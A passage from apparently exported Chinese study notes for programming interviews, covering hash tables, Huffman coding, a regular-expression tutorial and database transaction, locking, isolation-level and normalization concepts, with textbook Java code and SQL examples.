根节点一定为黑色，因为根节点没有上层节点，也就没有上层节点的左链接指向根节点。flipColors() 有可能会使得根节点的颜色变为红色，每当根节点由红色变成黑色时树的黑链接高度加 1. 5. 分析一颗大小为 N 的红黑树的高度不会超过 2logN。最坏的情况下是它所对应的 2-3 树，构成最左边的路径节点全部都是 3- 节点而其余都是 2- 节点。 红黑树大多数的操作所需要的时间都是对数级别的。 散列表散列表类似于数组，可以把散列表的散列值看成数组的索引值。访问散列表和访问数组元素一样快速，它可以在常数时间内实现查找和插入操作。 由于无法通过散列值知道键的大小关系，因此散列表无法实现有序性操作。 1. 散列函数对于一个大小为 M 的散列表，散列函数能够把任意键转换为 [0, M-1] 内的正整数，该正整数即为 hash 值。 散列表存在冲突，也就是两个不同的键可能有相同的 hash 值。 散列函数应该满足以下三个条件： 一致性：相等的键应当有相等的 hash 值，两个键相等表示调用 equals() 返回的值相等。 高效性：计算应当简便，有必要的话可以把 hash 值缓存起来，在调用 hash 函数时直接返回。 均匀性：所有键的 hash 值应当均匀地分布到 [0, M-1] 之间，这个条件至关重要，直接影响到散列表的性能。 除留余数法可以将整数散列到 [0, M-1] 之间，例如一个正整数 k，计算 k%M 既可得到一个 [0, M-1] 之间的 hash 值。注意 M 必须是一个素数，否则无法利用键包含的所有信息。例如 M 为 10k，那么只能利用键的后 k 位。 对于其它数，可以将其转换成整数的形式，然后利用除留余数法。例如对于浮点数，可以将其表示成二进制形式，然后使用二进制形式的整数值进行除留余数法。 对于有多部分组合的键，每部分都需要计算 hash 值，并且最后合并时需要让每部分 hash 值都具有同等重要的地位。可以将该键看成 R 进制的整数，键中每部分都具有不同的权值。 例如，字符串的散列函数实现如下 123int hash = 0;for (int i = 0; i &lt; s.length(); i++) hash = (R * hash + s.charAt(i)) % M; 再比如，拥有多个成员的自定义类的哈希函数如下： 1int hash = (((day * R + month) % M) * R + year) % M; R 通常取 31。 Java 中的 hashCode() 实现了 hash 函数，但是默认使用对象的内存地址值。在使用 hashCode() 函数时，应当结合除留余数法来使用。因为内存地址是 32 位整数，我们只需要 31 位的非负整数，因此应当屏蔽符号位之后再使用除留余数法。 1int hash = (x.hashCode() &amp; 0x7fffffff) % M; 使用 Java 自带的 HashMap 等自带的哈希表实现时，只需要去实现 Key 类型的 hashCode() 函数即可。Java 规定 hashCode() 能够将键均匀分布于所有的 32 位整数，Java 中的 String、Integer 等对象的 hashCode() 都能实现这一点。以下展示了自定义类型如何实现 hashCode()。 1234567891011121314151617181920public class Transaction &#123; private final String who; private final Date when; private final double amount; public Transaction(String who, Date when, double amount) &#123; this.who = who; this.when = when; this.amount = amount; &#125; public int hashCode() &#123; int hash = 17; int R = 31; hash = R * hash + who.hashCode(); hash = R * hash + when.hashCode(); hash = R * hash + ((Double) amount).hashCode(); return hash; &#125;&#125; 2. 基于拉链法的散列表拉链法使用链表来存储 hash 值相同的键，从而解决冲突。此时查找需要分两步，首先查找 Key 所在的链表，然后在链表中顺序查找。 对于 N 个键，M 条链表 (N&gt;M)，如果哈希函数能够满足均匀性的条件，每条链表的大小趋向于 N/M，因此未命中的查找和插入操作所需要的比较次数为 ~N/M。 3. 基于线性探测法的散列表线性探测法使用空位来解决冲突，当冲突发生时，向前探测一个空位来存储冲突的键。使用线性探测法，数组的大小 M 应当大于键的个数 N（M&gt;N)。 123456789101112131415161718192021222324public class LinearProbingHashST&lt;Key, Value&gt; implements UnorderedST&lt;Key, Value&gt; &#123; private int N = 0; private int M = 16; private Key[] keys; private Value[] values; public LinearProbingHashST() &#123; init(); &#125; public LinearProbingHashST(int M) &#123; this.M = M; init(); &#125; private void init() &#123; keys = (Key[]) new Object[M]; values = (Value[]) new Object[M]; &#125; private int hash(Key key) &#123; return (key.hashCode() &amp; 0x7fffffff) % M; &#125;&#125; （一）查找 1234567public Value get(Key key) &#123; for (int i = hash(key); keys[i] != null; i = (i + 1) % M) if (keys[i].equals(key)) return values[i]; return null;&#125; （二）插入 1234567891011121314151617public void put(Key key, Value value) &#123; resize(); putInternal(key, value);&#125;private void putInternal(Key key, Value value) &#123; int i; for (i = hash(key); keys[i] != null; i = (i + 1) % M) if (keys[i].equals(key)) &#123; values[i] = value; return; &#125; keys[i] = key; values[i] = value; N++;&#125; （三）删除 删除操作应当将右侧所有相邻的键值对重新插入散列表中。 1234567891011121314151617181920212223242526public void delete(Key key) &#123; int i = hash(key); while (keys[i] != null &amp;&amp; !key.equals(keys[i])) i = (i + 1) % M; // 不存在，直接返回 if (keys[i] == null) return; keys[i] = null; values[i] = null; // 将之后相连的键值对重新插入 i = (i + 1) % M; while (keys[i] != null) &#123; Key keyToRedo = keys[i]; Value valToRedo = values[i]; keys[i] = null; values[i] = null; N--; putInternal(keyToRedo, valToRedo); i = (i + 1) % M; &#125; N--; resize();&#125; （四）调整数组大小 线性探测法的成本取决于连续条目的长度，连续条目也叫聚簇。当聚簇很长时，在查找和插入时也需要进行很多次探测。例如下图中 2~5 位置就是一个聚簇。 α = N/M，把 α 称为利用率。理论证明，当 α 小于 1/2 时探测的预计次数只在 1.5 到 2.5 之间。 为了保证散列表的性能，应当调整数组的大小，使得 α 在 [1/4, 1/2] 之间。 1234567891011121314151617private void resize() &#123; if (N &gt;= M / 2) resize(2 * M); else if (N &lt;= M / 8) resize(M / 2);&#125;private void resize(int cap) &#123; LinearProbingHashST&lt;Key, Value&gt; t = new LinearProbingHashST&lt;Key, Value&gt;(cap); for (int i = 0; i &lt; M; i++) if (keys[i] != null) t.putInternal(keys[i], values[i]); keys = t.keys; values = t.values; M = t.M;&#125; 小结1. 符号表算法比较 算法 插入 查找 是否有序 二分查找实现的有序表 N logN yes 二叉查找树 logN logN yes 2-3 查找树 logN logN yes 链表实现的有序表 N N no 拉链法实现的散列表 N/M N/M no 线性探测法实现的散列表 1 1 no 应当优先考虑散列表，当需要有序性操作时使用红黑树。 2. Java 的符号表实现 java.util.TreeMap：红黑树 java.util.HashMap：拉链法的散列表 3. 稀疏向量乘法当向量为稀疏向量时，可以使用符号表来存储向量中的非 0 索引和值，使得乘法运算只需要对那些非 0 元素进行即可。 123456789101112131415161718192021public class SparseVector &#123; private HashMap&lt;Integer, Double&gt; hashMap; public SparseVector(double[] vector) &#123; hashMap = new HashMap&lt;&gt;(); for (int i = 0; i &lt; vector.length; i++) if (vector[i] != 0) hashMap.put(i, vector[i]); &#125; public double get(int i) &#123; return hashMap.getOrDefault(i, 0.0); &#125; public double dot(SparseVector other) &#123; double sum = 0; for (int i : hashMap.keySet()) sum += this.get(i) * other.get(i); return sum; &#125;&#125; 七、其它汉诺塔这是一个经典的递归问题，分为三步求解： 将 n-1 个圆盘从 from -&gt; buffer 将 1 个圆盘从 from -&gt; to 将 n-1 个圆盘从 buffer -&gt; to 如果只有一个圆盘，那么只需要进行一次移动操作，从上面的移动步骤可以知道，n 圆盘需要移动 (n-1)+1+(n-1) = 2n-1 次。 123456789101112131415public class Hanoi &#123; public static void move(int n, String from, String buffer, String to) &#123; if (n == 1) &#123; System.out.println("from " + from + " to " + to); return; &#125; move(n - 1, from, to, buffer); move(1, from, buffer, to); move(n - 1, buffer, from, to); &#125; public static void main(String[] args) &#123; Hanoi.move(3, "H1", "H2", "H3"); &#125;&#125; 1234567from H1 to H3from H1 to H2from H3 to H2from H1 to H3from H2 to H1from H2 to H3from H1 to H3 哈夫曼编码哈夫曼编码根据数据出现的频率对数据进行编码，从而压缩原始数据。 例如对于文本文件，其中各种字符出现的次数如下： a : 10 b : 20 c : 40 d : 80 可以将每种字符转换成二进制编码，例如将 a 转换为 00，b 转换为 01，c 转换为 10，d 转换为 11。这是最简单的一种编码方式，没有考虑各个字符的权值（出现频率）。而哈夫曼编码能让出现频率最大的字符编码最短，从而保证最终的编码长度最短。 首先生成一颗哈夫曼树，每次生成过程中选取频率最少的两个节点，生成一个新节点作为它们的父节点，并且新节点的频率为两个节点的和。选取频率最少的原因是，生成过程使得先选取的节点在树的最底层，那么需要的编码长度更长，频率更少可以使得总编码长度更少。 生成编码时，从根节点出发，向左遍历则添加二进制位 0，向右则添加二进制位 1，直到遍历到根节点，根节点代表的字符的编码就是这个路径编码。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public class Huffman &#123; private class Node implements Comparable&lt;Node&gt; &#123; char ch; int freq; boolean isLeaf; Node left, right; public Node(char ch, int freq) &#123; this.ch = ch; this.freq = freq; isLeaf = true; &#125; public Node(Node left, Node right, int freq) &#123; this.left = left; this.right = right; this.freq = freq; isLeaf = false; &#125; @Override public int compareTo(Node o) &#123; return this.freq - o.freq; &#125; &#125; public Map&lt;Character, String&gt; encode(Map&lt;Character, Integer&gt; frequencyForChar) &#123; PriorityQueue&lt;Node&gt; priorityQueue = new PriorityQueue&lt;&gt;(); for (Character c : frequencyForChar.keySet()) &#123; priorityQueue.add(new Node(c, frequencyForChar.get(c))); &#125; while (priorityQueue.size() != 1) &#123; Node node1 = priorityQueue.poll(); Node node2 = priorityQueue.poll(); priorityQueue.add(new Node(node1, node2, node1.freq + node2.freq)); &#125; return encode(priorityQueue.poll()); &#125; private Map&lt;Character, String&gt; encode(Node root) &#123; Map&lt;Character, String&gt; encodingForChar = new HashMap&lt;&gt;(); encode(root, "", encodingForChar); return encodingForChar; &#125; private void encode(Node node, String encoding, Map&lt;Character, String&gt; encodingForChar) &#123; if (node.isLeaf) &#123; encodingForChar.put(node.ch, encoding); return; &#125; encode(node.left, encoding + '0', encodingForChar); encode(node.right, encoding + '1', encodingForChar); &#125;&#125; 参考资料 Sedgewick, Robert, and Kevin Wayne. Algorithms. Addison-Wesley Professional, 2011.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[一、概述 二、匹配单个字符 三、匹配一组字符 四、使用元字符 五、重复匹配 六、位置匹配 七、使用子表达式 八、回溯引用 九、前后查找 十、嵌入条件 参考资料 一、概述正则表达式用于文本内容的查找和替换。 正则表达式内置于其它语言或者软件产品中，它本身不是一种语言或者软件。 正则表达式在线工具 二、匹配单个字符正则表达式一般是区分大小写的，但是也有些实现是不区分。 . 可以用来匹配任何的单个字符，但是在绝大多数实现里面，不能匹配换行符； \ 是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上 \ 。 正则表达式 1nam. 匹配结果 My name is Zheng. 三、匹配一组字符[ ] 定义一个字符集合； 0-9、a-z 定义了一个字符区间，区间使用 ASCII 码来确定，字符区间只能用在 [ ] 之间。 - 元字符只有在 [ ] 之间才是元字符，在 [ ] 之外就是一个普通字符； ^ 在 [ ] 字符集合中是取非操作。 应用 匹配以 abc 为开头，并且最后一个字母不为数字的字符串： 正则表达式 1abc[^0-9] 匹配结果 abcd abc1 abc2 四、使用元字符匹配空白字符 元字符 说明 [\b] 回退（删除）一个字符 \f 换页符 \n 换行符 \r 回车符 \t 制表符 \v 垂直制表符 \r\n 是 Windows 中的文本行结束标签，在 Unix/Linux 则是 \n ；\r\n\r\n 可以匹配 Windows 下的空白行，因为它将匹配两个连续的行尾标签，而这正是两条记录之间的空白行； . 是元字符，前提是没有对它们进行转义；f 和 n 也是元字符，但是前提是对它们进行了转义。 匹配特定的字符类别1. 数字元字符 元字符 说明 \d 数字字符，等价于 [0-9] \D 非数字字符，等价于 [^0-9] 2. 字母数字元字符 元字符 说明 \w 大小写字母，下划线和数字，等价于 [a-zA-Z0-9_] \W 对 \w 取非 3. 空白字符元字符 元字符 说明 \s 任何一个空白字符，等价于 [\f\n\r\t\v] \S 对 \s 取非 \x 匹配十六进制字符，\0 匹配八进制，例如 \x0A 对应 ASCII 字符 10 ，等价于 \n，也就是它会匹配 \n 。 五、重复匹配+ 匹配 1 个或者多个字符， * 匹配 0 个或者多个，? 匹配 0 个或者 1 个。 应用 匹配邮箱地址。 正则表达式 1[\w.]+@\w+\.\w+ [\w.] 匹配的是字母数字或者 . ，在其后面加上 + ，表示匹配多次。在字符集合 [ ] 里，. 不是元字符； 匹配结果 abc.def@qq.com 为了可读性，常常把转义的字符放到字符集合 [ ] 中，但是含义是相同的。 12[\w.]+@\w+\.\w+[\w.]+@[\w]+[\.][\w]+ {n} 匹配 n 个字符，{m, n} 匹配 m~n 个字符，{m,} 至少匹配 m 个字符； * 和 + 都是贪婪型元字符，会匹配最多的内容，在元字符后面加 ? 可以转换为懒惰型元字符，例如 *?、+? 和 {m, n}? 。 正则表达式 1a.+c 由于 + 是贪婪型的，因此 .+ 会匹配更可能多的内容，所以会把整个 abcabcabc 文本都匹配，而不是只匹配前面的 abc 文本。用懒惰型可以实现匹配前面的。 匹配结果 abcabcabc 六、位置匹配单词边界\b 可以匹配一个单词的边界，边界是指位于 \w 和 \W 之间的位置；\B 匹配一个不是单词边界的位置。 \b 只匹配位置，不匹配字符，因此 \babc\b 匹配出来的结果为 3 个字符。 字符串边界^ 匹配整个字符串的开头，$ 匹配结尾。 ^ 元字符在字符集合中用作求非，在字符集合外用作匹配字符串的开头。 分行匹配模式（multiline）下，换行被当做字符串的边界。 应用 匹配代码中以 // 开始的注释行 正则表达式 1^\s*\/\/.*$ 匹配结果 public void fun() { &nbsp;&nbsp;&nbsp;&nbsp; // 注释 1 &nbsp;&nbsp;&nbsp;&nbsp; int a = 1; &nbsp;&nbsp;&nbsp;&nbsp; int b = 2; &nbsp;&nbsp;&nbsp;&nbsp; // 注释 2 &nbsp;&nbsp;&nbsp;&nbsp; int c = a + b; } 七、使用子表达式使用 ( ) 定义一个子表达式。子表达式的内容可以当成一个独立元素，即可以将它看成一个字符，并且使用 * 等元字符。 子表达式可以嵌套，但是嵌套层次过深会变得很难理解。 正则表达式 1(ab)&#123;2,&#125; 匹配结果 ababab | 是或元字符，它把左边和右边所有的部分都看成单独的两个部分，两个部分只要有一个匹配就行。 正则表达式 1(19|20)\d&#123;2&#125; 匹配结果 1900 2010 1020 应用 匹配 IP 地址。IP 地址中每部分都是 0-255 的数字，用正则表达式匹配时以下情况是合法的： 一位数字 不以 0 开头的两位数字 1 开头的三位数 2 开头，第 2 位是 0-4 的三位数 25 开头，第 3 位是 0-5 的三位数 正则表达式 1((25[0-5]|(2[0-4]\d)|(1\d&#123;2&#125;)|([1-9]\d)|(\d))\.)&#123;3&#125;(25[0-5]|(2[0-4]\d)|(1\d&#123;2&#125;)|([1-9]\d)|(\d)) 匹配结果 192.168.0.1 00.00.00.00 555.555.555.555 八、回溯引用回溯引用使用 \n 来引用某个子表达式，其中 n 代表的是子表达式的序号，从 1 开始。它和子表达式匹配的内容一致，比如子表达式匹配到 abc，那么回溯引用部分也需要匹配 abc 。 应用 匹配 HTML 中合法的标题元素。 正则表达式 \1 将回溯引用子表达式 (h[1-6]) 匹配的内容，也就是说必须和子表达式匹配的内容一致。 1&lt;(h[1-6])&gt;\w*?&lt;\/\1&gt; 匹配结果 &lt;h1&gt;x&lt;/h1&gt; &lt;h2&gt;x&lt;/h2&gt; &lt;h3&gt;x&lt;/h1&gt; 替换需要用到两个正则表达式。 应用 修改电话号码格式。 文本 313-555-1234 查找正则表达式 1(\d&#123;3&#125;)(-)(\d&#123;3&#125;)(-)(\d&#123;4&#125;) 替换正则表达式 在第一个子表达式查找的结果加上 () ，然后加一个空格，在第三个和第五个字表达式查找的结果中间加上 - 进行分隔。 1($1) $3-$5 结果 (313) 555-1234 大小写转换 元字符 说明 \l 把下个字符转换为小写 \u 把下个字符转换为大写 \L 把\L 和\E 之间的字符全部转换为小写 \U 把\U 和\E 之间的字符全部转换为大写 \E 结束\L 或者\U 应用 把文本的第二个和第三个字符转换为大写。 文本 abcd 查找 1(\w)(\w&#123;2&#125;)(\w) 替换 1$1\U$2\E$3 结果 aBCd 九、前后查找前后查找规定了匹配的内容首尾应该匹配的内容，但是又不包含首尾匹配的内容。向前查找用 ?= 来定义，它规定了尾部匹配的内容，这个匹配的内容在 ?= 之后定义。所谓向前查找，就是规定了一个匹配的内容，然后以这个内容为尾部向前面查找需要匹配的内容。向后匹配用 ?&lt;= 定义（注: javaScript 不支持向后匹配, java 对其支持也不完善）。 应用 查找出邮件地址 @ 字符前面的部分。 正则表达式 1\w+(?=@) 结果 abc @qq.com 对向前和向后查找取非，只要把 = 替换成 ! 即可，比如 (?=) 替换成 (?!) 。取非操作使得匹配那些首尾不符合要求的内容。 十、嵌入条件回溯引用条件条件判断为某个子表达式是否匹配，如果匹配则需要继续匹配条件表达式后面的内容。 正则表达式 子表达式 (\() 匹配一个左括号，其后的 ? 表示匹配 0 个或者 1 个。 ?(1) 为条件，当子表达式 1 匹配时条件成立，需要执行 ) 匹配，也就是匹配右括号。 1(\()?abc(?(1)\)) 结果 (abc) abc (abc 前后查找条件条件为定义的首尾是否匹配，如果匹配，则继续执行后面的匹配。注意，首尾不包含在匹配的内容中。 正则表达式 ?(?=-) 为前向查找条件，只有在以 - 为前向查找的结尾能匹配 \d{5} ，才继续匹配 -\d{4} 。 1\d&#123;5&#125;(?(?=-)-\d&#123;4&#125;) 结果 11111 22222- 33333-4444 参考资料 BenForta. 正则表达式必知必会 [M]. 人民邮电出版社, 2007.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库系统原理]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[一、事务 概念 ACID AUTOCOMMIT 二、并发一致性问题 丢失修改 读脏数据 不可重复读 幻影读 三、封锁 封锁粒度 封锁类型 封锁协议 MySQL 隐式与显示锁定 四、隔离级别 未提交读（READ UNCOMMITTED） 提交读（READ COMMITTED） 可重复读（REPEATABLE READ） 可串行化（SERIALIZABLE） 五、多版本并发控制 版本号 Undo 日志 实现过程 快照读与当前读 六、Next-Key Locks Record Locks Grap Locks Next-Key Locks 七、关系数据库设计理论 函数依赖 异常 范式 八、ER 图 实体的三种联系 表示出现多次的关系 联系的多向性 表示子类 参考资料 一、事务概念 事务指的是满足 ACID 特性的一组操作，可以通过 Commit 提交一个事务，也可以使用 Rollback 进行回滚。 ACID1. 原子性（Atomicity）事务被视为不可分割的最小单元，事务的所有操作要么全部提交成功，要么全部失败回滚。 回滚可以用日志来实现，日志记录着事务所执行的修改操作，在回滚时反向执行这些修改操作即可。 2. 一致性（Consistency）数据库在事务执行前后都保持一致性状态。 在一致性状态下，所有事务对一个数据的读取结果都是相同的。 3. 隔离性（Isolation）一个事务所做的修改在最终提交以前，对其它事务是不可见的。 4. 持久性（Durability）一旦事务提交，则其所做的修改将会永远保存到数据库中。即使系统发生崩溃，事务执行的结果也不能丢失。 可以通过数据库备份和恢复来实现，在系统发生崩溃时，使用备份的数据库进行数据恢复。 事务的 ACID 特性概念简单，但不是很好理解，主要是因为这几个特性不是一种平级关系： 只有满足一致性，事务的执行结果才是正确的。 在无并发的情况下，事务串行执行，隔离性一定能够满足。此时要只要能满足原子性，就一定能满足一致性。 在并发的情况下，多个事务并发执行，事务不仅要满足原子性，还需要满足隔离性，才能满足一致性。 事务满足持久化是为了能应对数据库崩溃的情况。 AUTOCOMMITMySQL 默认采用自动提交模式。也就是说，如果不显式使用START TRANSACTION语句来开始一个事务，那么每个查询都会被当做一个事务自动提交。 二、并发一致性问题在并发环境下，事务的隔离性很难保证，因此会出现很多并发一致性问题。 丢失修改T1 和 T2 两个事务都对一个数据进行修改，T1 先修改，T2 随后修改，T2 的修改覆盖了 T1 的修改。 读脏数据T1 修改一个数据，T2 随后读取这个数据。如果 T1 撤销了这次修改，那么 T2 读取的数据是脏数据。 不可重复读T2 读取一个数据，T1 对该数据做了修改。如果 T2 再次读取这个数据，此时读取的结果和第一次读取的结果不同。 幻影读T1 读取某个范围的数据，T2 在这个范围内插入新的数据，T1 再次读取这个范围的数据，此时读取的结果和和第一次读取的结果不同。 产生并发不一致性问题主要原因是破坏了事务的隔离性，解决方法是通过并发控制来保证隔离性。并发控制可以通过封锁来实现，但是封锁操作需要用户自己控制，相当复杂。数据库管理系统提供了事务的隔离级别，让用户以一种更轻松的方式处理并发一致性问题。 三、封锁封锁粒度 MySQL 中提供了两种封锁粒度：行级锁以及表级锁。 应该尽量只锁定需要修改的那部分数据，而不是所有的资源。锁定的数据量越少，发生锁争用的可能就越小，系统的并发程度就越高。 但是加锁需要消耗资源，锁的各种操作（包括获取锁、释放锁、以及检查锁状态）都会增加系统开销。因此封锁粒度越小，系统开销就越大。 在选择封锁粒度时，需要在锁开销和并发程度之间做一个权衡。 封锁类型1. 读写锁 排它锁（Exclusive），简写为 X 锁，又称写锁。 共享锁（Shared），简写为 S 锁，又称读锁。 有以下两个规定： 一个事务对数据对象 A 加了 X 锁，就可以对 A 进行读取和更新。加锁期间其它事务不能对 A 加任何锁。 一个事务对数据对象 A 加了 S 锁，可以对 A 进行读取操作，但是不能进行更新操作。加锁期间其它事务能对 A 加 S 锁，但是不能加 X 锁。 锁的兼容关系如下： - X S X NO NO S NO YES 2. 意向锁使用意向锁（Intention Locks）可以更容易地支持多粒度封锁。 在存在行级锁和表级锁的情况下，事务 T 想要对表 A 加 X 锁，就需要先检测是否有其它事务对表 A 或者表 A 中的任意一行加了锁，那么就需要对表 A 的每一行都检测一次，这是非常耗时的。 意向锁在原来的 X/S 锁之上引入了 IX/IS，IX/IS 都是表锁，用来表示一个事务想要在表中的某个数据行上加 X 锁或 S 锁。有以下两个规定： 一个事务在获得某个数据行对象的 S 锁之前，必须先获得表的 IS 锁或者更强的锁； 一个事务在获得某个数据行对象的 X 锁之前，必须先获得表的 IX 锁。 通过引入意向锁，事务 T 想要对表 A 加 X 锁，只需要先检测是否有其它事务对表 A 加了 X/IX/S/IS 锁，如果加了就表示有其它事务正在使用这个表或者表中某一行的锁，因此事务 T 加 X 锁失败。 各种锁的兼容关系如下： - X IX S IS X NO NO NO NO IX NO YES NO YES S NO NO YES YES IS NO YES YES YES 解释如下： 任意 IS/IX 锁之间都是兼容的，因为它们只是表示想要对表加锁，而不是真正加锁； S 锁只与 S 锁和 IS 锁兼容，也就是说事务 T 想要对数据行加 S 锁，其它事务可以已经获得对表或者表中的行的 S 锁。 封锁协议1. 三级封锁协议一级封锁协议 事务 T 要修改数据 A 时必须加 X 锁，直到 T 结束才释放锁。 可以解决丢失修改问题，因为不能同时有两个事务对同一个数据进行修改，那么事务的修改就不会被覆盖。 T1 T2 lock-x(A) read A=20 lock-x(A) wait write A=19 . commit . unlock-x(A) . obtain read A=19 write A=21 commit unlock-x(A) 二级封锁协议 在一级的基础上，要求读取数据 A 时必须加 S 锁，读取完马上释放 S 锁。 可以解决读脏数据问题，因为如果一个事务在对数据 A 进行修改，根据 1 级封锁协议，会加 X 锁，那么就不能再加 S 锁了，也就是不会读入数据。 T1 T2 lock-x(A) read A=20 write A=19 lock-s(A) wait rollback . A=20 . unlock-x(A) . obtain read A=20 commit unlock-s(A) 三级封锁协议 在二级的基础上，要求读取数据 A 时必须加 S 锁，直到事务结束了才能释放 S 锁。 可以解决不可重复读的问题，因为读 A 时，其它事务不能对 A 加 X 锁，从而避免了在读的期间数据发生改变。 T1 T2 lock-s(A) read A=20 lock-x(A) wait read A=20 . commit . unlock-s(A) . obtain read A=20 write A=19 commit unlock-X(A) 2. 两段锁协议加锁和解锁分为两个阶段进行。 可串行化调度是指，通过并发控制，使得并发执行的事务结果与某个串行执行的事务结果相同。 事务遵循两段锁协议是保证可串行化调度的充分条件。例如以下操作满足两段锁协议，它是可串行化调度。 1lock-x(A)...lock-s(B)...lock-s(C)...unlock(A)...unlock(C)...unlock(B) 但不是必要条件，例如以下操作不满足两段锁协议，但是它还是可串行化调度。 1lock-x(A)...unlock(A)...lock-s(B)...unlock(B)...lock-s(C)...unlock(C) MySQL 隐式与显示锁定MySQL 的 InnoDB 存储引擎采用两段锁协议，会根据隔离级别在需要的时候自动加锁，并且所有的锁都是在同一时刻被释放，这被称为隐式锁定。 InnoDB 也可以使用特定的语句进行显示锁定： 12SELECT ... LOCK In SHARE MODE;SELECT ... FOR UPDATE; 四、隔离级别未提交读（READ UNCOMMITTED）事务中的修改，即使没有提交，对其它事务也是可见的。 提交读（READ COMMITTED）一个事务只能读取已经提交的事务所做的修改。换句话说，一个事务所做的修改在提交之前对其它事务是不可见的。 可重复读（REPEATABLE READ）保证在同一个事务中多次读取同样数据的结果是一样的。 可串行化（SERIALIZABLE）强制事务串行执行。 隔离级别 脏读 不可重复读 幻影读 未提交读 YES YES YES 提交读 NO YES YES 可重复读 NO NO YES 可串行化 NO NO NO 五、多版本并发控制多版本并发控制（Multi-Version Concurrency Control, MVCC）是 MySQL 的 InnoDB 存储引擎实现隔离级别的一种具体方式，用于实现提交读和可重复读这两种隔离级别。而未提交读隔离级别总是读取最新的数据行，无需使用 MVCC；可串行化隔离级别需要对所有读取的行都加锁，单纯使用 MVCC 无法实现。 版本号 系统版本号：是一个递增的数字，每开始一个新的事务，系统版本号就会自动递增。 事务版本号：事务开始时的系统版本号。 InooDB 的 MVCC 在每行记录后面都保存着两个隐藏的列，用来存储两个版本号： 创建版本号：指示创建一个数据行的快照时的系统版本号； 删除版本号：如果该快照的删除版本号大于当前事务版本号表示该快照有效，否则表示该快照已经被删除了。 Undo 日志InnoDB 的 MVCC 使用到的快照存储在 Undo 日志中，该日志通过回滚指针把一个数据行（Record）的所有快照连接起来。 实现过程以下实现过程针对可重复读隔离级别。 1. SELECT当开始新一个事务时，该事务的版本号肯定会大于当前所有数据行快照的创建版本号，理解这一点很关键。 多个事务必须读取到同一个数据行的快照，并且这个快照是距离现在最近的一个有效快照。但是也有例外，如果有一个事务正在修改该数据行，那么它可以读取事务本身所做的修改，而不用和其它事务的读取结果一致。 把没有对一个数据行做修改的事务称为 T，T 所要读取的数据行快照的创建版本号必须小于 T 的版本号，因为如果大于或者等于 T 的版本号，那么表示该数据行快照是其它事务的最新修改，因此不能去读取它。 除了上面的要求，T 所要读取的数据行快照的删除版本号必须大于 T 的版本号，因为如果小于等于 T 的版本号，那么表示该数据行快照是已经被删除的，不应该去读取它。 2. INSERT将当前系统版本号作为数据行快照的创建版本号。 3. DELETE将当前系统版本号作为数据行快照的删除版本号。 4. UPDATE将当前系统版本号作为更新后的数据行快照的创建版本号，同时将当前系统版本号作为更新前的数据行快照的删除版本号。可以理解为先执行 DELETE 后执行 INSERT。 快照读与当前读1. 快照读使用 MVCC 读取的是快照中的数据，这样可以减少加锁所带来的开销。 1select * from table ...; 2. 当前读读取的是最新的数据，需要加锁。以下第一个语句需要加 S 锁，其它都需要加 X 锁。 12345select * from table where ? lock in share mode;select * from table where ? for update;insert;update;delete; 六、Next-Key LocksNext-Key Locks 也是 MySQL 的 InnoDB 存储引擎的一种锁实现。MVCC 不能解决幻读的问题，Next-Key Locks 就是为了解决这个问题而存在的。在可重复读（REPEATABLE READ）隔离级别下，使用 MVCC + Next-Key Locks 可以解决幻读问题。 Record Locks锁定整个记录（行）。锁定的对象是记录的索引，而不是记录本身。如果表没有设置索引，InnoDB 会自动在主键上创建隐藏的聚集索引，因此 Record Locks 依然可以使用。 Grap Locks锁定一个范围内的索引，例如当一个事务执行以下语句，其它事务就不能在 t.c 中插入 15。 1SELECT c FROM t WHERE c BETWEEN 10 and 20 FOR UPDATE; Next-Key Locks它是 Record Locks 和 Gap Locks 的结合，不仅锁定一个记录，也锁定范围内的索引。在 user 中有以下记录： 12345678| id | last_name | first_name | age ||------|-------------|--------------|-------|| 4 | stark | tony | 21 || 1 | tom | hiddleston | 30 || 3 | morgan | freeman | 40 || 5 | jeff | dean | 50 || 2 | donald | trump | 80 |+------|-------------|--------------|-------+ 那么就需要锁定以下范围： 123456(-∞, 21](21, 30](30, 40](40, 50](50, 80](80, ∞) 七、关系数据库设计理论函数依赖记 A-&gt;B 表示 A 函数决定 B，也可以说 B 函数依赖于 A。 如果 {A1，A2，… ，An} 是关系的一个或多个属性的集合，该集合函数决定了关系的其它所有属性并且是最小的，那么该集合就称为键码。 对于 A-&gt;B，如果能找到 A 的真子集 A’，使得 A’-&gt; B，那么 A-&gt;B 就是部分函数依赖，否则就是完全函数依赖； 对于 A-&gt;B，B-&gt;C，则 A-&gt;C 是一个传递函数依赖。 异常以下的学生课程关系的函数依赖为 Sno, Cname -&gt; Sname, Sdept, Mname, Grade，键码为 {Sno, Cname}。也就是说，确定学生和课程之后，就能确定其它信息。 Sno Sname Sdept Mname Cname Grade 1 学生-1 学院-1 院长-1 课程-1 90 2 学生-2 学院-2 院长-2 课程-2 80 2 学生-2 学院-2 院长-2 课程-1 100 3 学生-3 学院-2 院长-2 课程-2 95 不符合范式的关系，会产生很多异常，主要有以下四种异常： 冗余数据：例如 学生-2 出现了两次。 修改异常：修改了一个记录中的信息，但是另一个记录中相同的信息却没有被修改。 删除异常：删除一个信息，那么也会丢失其它信息。例如如果删除了 课程-1，需要删除第一行和第三行，那么 学生-1 的信息就会丢失。 插入异常，例如想要插入一个学生的信息，如果这个学生还没选课，那么就无法插入。 范式范式理论是为了解决以上提到四种异常。 高级别范式的依赖于低级别的范式，1NF 是最低级别的范式。 1. 第一范式 (1NF)属性不可分； 2. 第二范式 (2NF)每个非主属性完全函数依赖于键码。 